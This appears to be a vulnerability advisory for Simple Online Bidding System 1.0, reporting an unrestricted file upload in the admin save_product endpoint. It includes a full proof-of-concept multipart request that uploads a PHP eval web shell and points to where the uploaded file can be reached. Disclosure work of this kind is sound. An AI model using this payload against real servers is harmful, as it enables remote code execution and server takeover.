## Affected version: 
Simple Online Bidding System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

## Vulnerability File:
/simple-online-bidding-system/admin/ajax.php?action=save_product

## Description:
Simple Online Bidding System 1.0 is vulnerable to the /simple-online-bidding-system/admin/ajax.php?action=save_product unrestricted file upload attack. This function point does not impose any restrictions on suffixes. A malicious attacker could exploit this vulnerability to gain server privileges.

Status: CRITICAL

POC
```
POST /simple-online-bidding-system/admin/ajax.php?action=save_product HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------23417102524039633104198795843
Content-Length: 1103
Origin: http://localhost
Connection: close
Referer: http://localhost/simple-online-bidding-system/admin/index.php?page=manage_product&id=3
Cookie: PHPSESSID=44palbgphqda0ug0pvlpmao3tp
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.1.23

-----------------------------23417102524039633104198795843
Content-Disposition: form-data; name="id"

3
-----------------------------23417102524039633104198795843
Content-Disposition: form-data; name="name"

Gadget Package
-----------------------------23417102524039633104198795843
Content-Disposition: form-data; name="category_id"

1
-----------------------------23417102524039633104198795843
Content-Disposition: form-data; name="description"

Sample 
-----------------------------23417102524039633104198795843
Content-Disposition: form-data; name="regular_price"

15000
-----------------------------23417102524039633104198795843
Content-Disposition: form-data; name="start_bid"

150000
-----------------------------23417102524039633104198795843
Content-Disposition: form-data; name="bid_end_datetime"

2020-10-27 17:00
-----------------------------23417102524039633104198795843
Content-Disposition: form-data; name="img"; filename="1.php"
Content-Type: application/octet-stream

<?php eval($_POST[1]);?>
-----------------------------23417102524039633104198795843--
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/d6b46f23-d090-486a-b325-daf77c3f965e)

http://localhost/simple-online-bidding-system/admin/assets/uploads/3.php

Connect via webshell management tool
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/d9cf0ba7-cb0a-4502-9ce2-5228c2e72206)

## code analysis:

Enter the save_product() method when action=save_product

![image](https://github.com/Hefei-Coffee/cve/assets/168982375/6add853b-e0b4-4004-9988-d223516b7f66)

There is no restriction on uploading in this method, causing an unlimited file upload vulnerability.
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/7133f8f7-c06c-4675-a7c7-e61f8ceb67c6)

